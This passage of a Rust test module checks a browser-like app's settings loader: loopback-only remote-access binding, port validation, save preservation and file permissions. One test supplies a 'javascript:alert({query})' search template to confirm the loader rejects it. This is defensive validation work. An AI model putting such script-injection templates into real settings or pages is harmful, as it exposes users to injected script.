                "remote_access":{"enabled":true,"port":41002,"bind":"0.0.0.0"}}"#,
        );

        let settings = Settings::load_from(temp.path());

        assert!(!settings.remote_access.enabled, "a wildcard bind must not enable anything");
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
        assert_eq!(settings.search_engine.name, "Kagi", "the engine was not this key's to reset");
        assert_eq!(settings.search_engine.url_template, "https://kagi.com/search?q={query}");
    }

    /// Every non-loopback spelling, not just the wildcard: an allowlist of one
    /// literal is the whole rule.
    #[test]
    fn every_bind_address_other_than_the_loopback_literal_is_refused() {
        for bind in ["0.0.0.0", "::", "localhost", "192.168.1.10", "127.0.0.2", "", "127.0.0.1 "] {
            let temp = TempPath::new();
            temp.write(&format!(
                r#"{{"remote_access":{{"enabled":true,"bind":{}}}}}"#,
                serde_json::json!(bind)
            ));

            let settings = Settings::load_from(temp.path());

            assert!(!settings.remote_access.enabled, "{bind:?} was accepted as a bind address");
        }
    }

    /// The one spelling that is allowed through, so the test above is proving
    /// a rule rather than a blanket refusal of the whole key.
    #[test]
    fn the_loopback_literal_is_the_one_bind_address_that_is_honoured() {
        let temp = TempPath::new();
        temp.write(r#"{"remote_access":{"enabled":true,"port":41003,"bind":"127.0.0.1"}}"#);

        let settings = Settings::load_from(temp.path());

        assert!(settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, 41003);
        assert_eq!(LOOPBACK_BIND, "127.0.0.1");
    }

    /// Port 0 means "any free port" to the kernel — the opposite of an
    /// address a human wrote into a client's configuration.
    #[test]
    fn a_zero_port_disables_remote_access_and_keeps_the_search_engine() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Kagi","url_template":"https://kagi.com/search?q={query}"},
                "remote_access":{"enabled":true,"port":0}}"#,
        );

        let settings = Settings::load_from(temp.path());

        assert!(!settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
        assert_eq!(settings.search_engine.name, "Kagi");
    }

    #[test]
    fn a_port_outside_the_valid_range_disables_remote_access_and_keeps_the_engine() {
        for port in ["65536", "-1", "\"41000\"", "41000.5", "null", "true"] {
            let temp = TempPath::new();
            temp.write(&format!(
                r#"{{"search_engine":{{"name":"Kagi","url_template":"https://kagi.com/search?q={{query}}"}},
                    "remote_access":{{"enabled":true,"port":{port}}}}}"#
            ));

            let settings = Settings::load_from(temp.path());

            assert!(!settings.remote_access.enabled, "port {port} was accepted");
            assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
            assert_eq!(settings.search_engine.name, "Kagi", "port {port} reset the engine");
        }
    }

    /// The counterpart to the degrade-only-itself rule above: a document that
    /// does not parse still resets the whole object, exactly as it did before
    /// this key existed.
    #[test]
    fn a_malformed_document_still_resets_the_whole_object() {
        let temp = TempPath::new();
        temp.write("not json at all {{{");

        let settings = Settings::load_from(temp.path());

        assert_eq!(settings.search_engine, SearchEngine::default());
        assert_eq!(settings.remote_access, RemoteAccessConfig::default());
    }

    /// A `javascript:` template still discards the engine — and, because that
    /// branch predates this key, it discards remote access with it. Pinned so
    /// the asymmetry is deliberate rather than discovered later.
    #[test]
    fn an_invalid_template_resets_the_whole_object_including_remote_access() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Evil","url_template":"javascript:alert({query})"},
                "remote_access":{"enabled":true,"port":41004}}"#,
        );

        let settings = Settings::load_from(temp.path());

        assert_eq!(settings.search_engine, SearchEngine::default());
        assert!(!settings.remote_access.enabled);
    }

    #[test]
    fn remote_access_round_trips_through_save_and_load() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());

        settings.save_remote_access(RemoteAccessConfig { enabled: true, port: 41005 });

        let reloaded = Settings::load_from(temp.path());
        assert!(reloaded.remote_access.enabled);
        assert_eq!(reloaded.remote_access.port, 41005);
    }

    /// One save must never erase the other key. Both directions, because the
    /// bug is symmetric and so is the fix.
    #[test]
    fn saving_remote_access_preserves_the_saved_search_engine() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Kagi".to_owned(),
            url_template: "https://kagi.com/search?q={query}".to_owned(),
        });

        settings.save_remote_access(RemoteAccessConfig { enabled: true, port: 41006 });

        let reloaded = Settings::load_from(temp.path());
        assert_eq!(reloaded.search_engine.name, "Kagi");
        assert!(reloaded.remote_access.enabled);
        assert_eq!(reloaded.remote_access.port, 41006);
    }

    #[test]
    fn saving_the_search_engine_preserves_saved_remote_access() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save_remote_access(RemoteAccessConfig { enabled: true, port: 41007 });

        settings.save(SearchEngine {
            name: "Kagi".to_owned(),
            url_template: "https://kagi.com/search?q={query}".to_owned(),
        });

        let reloaded = Settings::load_from(temp.path());
        assert!(reloaded.remote_access.enabled);
        assert_eq!(reloaded.remote_access.port, 41007);
        assert_eq!(reloaded.search_engine.name, "Kagi");
    }

    /// The stored document must never carry a bind key, so a later reader
    /// cannot mistake the refusal in `from_json` for one half of a round trip.
    #[test]
    fn a_saved_document_never_writes_a_bind_key() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save_remote_access(RemoteAccessConfig { enabled: true, port: 41008 });

        let written = temp.read();
        assert!(!written.contains("bind"), "the saved document named a bind address: {written}");
        assert!(written.contains("remote_access"), "{written}");
        assert!(written.contains("search_engine"), "{written}");
    }

    #[cfg(unix)]
    #[test]
    fn a_remote_access_save_lands_owner_only() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());

        settings.save_remote_access(RemoteAccessConfig { enabled: true, port: 41009 });

        assert_eq!(permissions::mode_of(&temp.path()), 0o600);
        assert!(!temp.temp_sibling().exists(), "the staging file outlived the save");
    }

    /// The same still-applies-to-the-session property `save` has, in the
    /// direction that matters most: turning it off must work even when the
    /// write cannot land.
    #[test]
    fn an_unwritable_path_still_turns_remote_access_off_in_the_running_session() {
        let temp = TempPath::new();
        temp.write("{}");
        let blocked = temp.path().join("nested").join("config.json");

        let mut settings = Settings::load_from(blocked);
        settings.remote_access = RemoteAccessConfig { enabled: true, port: 41010 };
        settings.save_remote_access(RemoteAccessConfig { enabled: false, port: 41010 });

        assert!(!settings.remote_access.enabled);
    }
}
